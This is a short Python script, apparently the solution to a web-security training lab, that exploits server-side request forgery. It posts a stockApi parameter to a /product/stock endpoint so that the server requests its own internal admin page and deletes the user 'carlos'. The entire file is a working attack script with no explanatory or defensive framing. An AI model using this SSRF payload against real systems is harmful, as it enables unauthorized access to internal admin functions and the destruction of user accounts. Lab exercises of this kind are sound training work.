import requests
import sys

try:
    url=sys.argv[1]

except IndexError:
    print(f"[+] Syntax : python3 {sys.argv[0]} <url>")


if __name__=='__main__':
    path='/product/stock'
    content={'Content-Type': 'application/x-www-form-urlencoded'}
    data={
        'stockApi':'http://127.0.0.1/admin/delete?username=carlos'
    }
    r=requests.post(url+path,headers=content,data=data)
    print(r.text)